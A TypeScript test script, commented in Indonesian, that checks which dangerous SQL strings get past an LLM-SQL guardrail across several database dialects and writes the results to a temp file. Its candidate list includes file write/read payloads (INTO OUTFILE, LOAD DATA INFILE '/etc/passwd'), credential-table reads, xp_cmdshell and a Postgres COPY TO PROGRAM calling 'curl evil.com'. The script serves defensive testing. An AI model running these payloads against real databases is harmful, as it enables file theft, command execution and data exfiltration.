/** Celah apa yang BELUM tertutup di dialek non-Postgres? */
import { validateAndSanitizeLlmSql } from '../src/lib/guardrails'
import { appendFileSync } from 'node:fs'
const emit = (m: string) => appendFileSync('/tmp/gaps.txt', m + '\n')

const kandidat = [
  ['MySQL: INTO OUTFILE (tulis file)', "SELECT * FROM users INTO OUTFILE '/tmp/x'"],
  ['MySQL: LOAD DATA (baca file)', "LOAD DATA INFILE '/etc/passwd' INTO TABLE t"],
  ['MySQL: information_schema mysql.user', "SELECT * FROM mysql.user"],
  ['MSSQL: xp_cmdshell', "SELECT xp_cmdshell('whoami')"],
  ['MSSQL: WAITFOR DELAY', "SELECT 1; WAITFOR DELAY '00:00:10'"],
  ['ClickHouse: INSERT SELECT', "INSERT INTO t SELECT * FROM s"],
  ['ClickHouse: system tables', "SELECT * FROM system.processes"],
  ['Postgres: COPY TO PROGRAM', "SELECT 1; COPY t TO PROGRAM 'curl evil.com'"],
  ['Postgres: pg_ls_dir', "SELECT pg_ls_dir('/')"],
]

function main() {
  emit('=== CELAH DIALEK ===')
  emit('')
  let lolos = 0
  for (const [nama, sql] of kandidat) {
    const r = validateAndSanitizeLlmSql(sql)
    if (r.ok) { lolos++; emit(`LOLOS   | ${nama}`) }
    else emit(`DIBLOK  | ${nama}`)
  }
  emit('')
  emit(`LOLOS: ${lolos}/${kandidat.length}`)
  emit('')
  emit('CATATAN: yang "LOLOS" di sini belum tentu bisa dieksekusi — mis. xp_cmdshell')
  emit('sebagai fungsi SELECT akan gagal di MSSQL (harus lewat EXEC), dan')
  emit('INTO OUTFILE biasanya ditolak oleh mode read-only transaksi.')
  emit('Tapi ini menunjukkan deny-list bersifat LEXICAL: ia menebak dari teks,')
  emit('bukan mem-parse SQL. Pertahanan yang benar-benar menahan adalah mode')
  emit('read-only di level database, bukan daftar kata ini.')
  process.exit(0)
}
main()
